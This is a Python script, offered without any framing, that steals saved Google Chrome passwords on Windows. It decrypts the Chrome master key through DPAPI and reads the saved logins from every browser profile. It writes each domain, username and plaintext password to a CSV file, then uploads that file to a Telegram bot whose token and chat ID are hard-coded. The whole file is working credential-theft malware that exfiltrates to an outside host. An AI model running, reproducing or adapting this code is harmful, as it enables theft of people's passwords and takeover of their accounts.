# pip install cryptography pywin32 requests


import os
import shutil
import sqlite3
import base64
import csv
import json
import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt

def get_chrome_key():
    """
    Retrieve the encryption key used by Chrome for decrypting passwords.
    """
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return key

def decrypt_password(encrypted_password, key):
    """
    Decrypt the encrypted password using the retrieved Chrome key.
    """
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:-16]
        auth_tag = encrypted_password[-16:]

        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, auth_tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(payload) + decryptor.finalize()
        return decrypted_password.decode("utf-8")
    except Exception as e:
        return f"Failed to decrypt: {e}"

def get_profile_name(profile_folder):
    """
    Retrieve the profile name from the 'Preferences' file in the profile folder.
    """
    preferences_path = os.path.join(profile_folder, "Preferences")
    if os.path.exists(preferences_path):
        with open(preferences_path, "r", encoding="utf-8") as file:
            preferences = json.load(file)
            profile_name = preferences.get("profile", {}).get("name")
            return profile_name
    return None

def extract_passwords(csv_file):
    """
    Copies the 'Login Data' file, decrypts passwords, and writes them to a CSV file.
    """
    key = get_chrome_key()
    base_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data"
    )

    with open(csv_file, "w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Profile", "Domain", "Username", "Password"])
        
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 51)]:
            profile_folder = os.path.join(base_path, profile)
            logindb = os.path.join(profile_folder, "Login Data")
            
            if os.path.exists(logindb):
                profile_name = get_profile_name(profile_folder)
                profile_display = f"{profile} ({profile_name})" if profile_name else profile
                
                try:
                    local_copy = f"{profile}_logindb"
                    shutil.copy2(logindb, local_copy)

                    conn = sqlite3.connect(local_copy)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    data = cursor.fetchall()
                    
                    for row in data:
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = decrypt_password(encrypted_password, key)
                        writer.writerow([profile_display, origin_url, username, decrypted_password])
                    
                    conn.close()
                    os.remove(local_copy)
                except Exception as e:
                    print(f"Error processing {profile}: {e}")

def send_file_to_telegram(csv_file, bot_token, user_id):
    """
    Sends the CSV file to a Telegram user using the Telegram Bot API.
    """
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(csv_file, "rb") as file:
        response = requests.post(url, data={"chat_id": user_id}, files={"document": file})
    if response.status_code == 200:
        print("CSV file sent successfully to Telegram.")
    else:
        print(f"Failed to send file to Telegram. Response: {response.text}")

# Main execution
if __name__ == "__main__":
    csv_file = "chrome_passwords.csv"
    bot_token = "7716674311:AAF7RaHzwYciyc7flTxRARh-lHPitaM8kMY"  # Replace with your Telegram bot API token
    user_id = "2141142912"  # Replace with your Telegram user ID
    
    extract_passwords(csv_file)
    send_file_to_telegram(csv_file, bot_token, user_id)
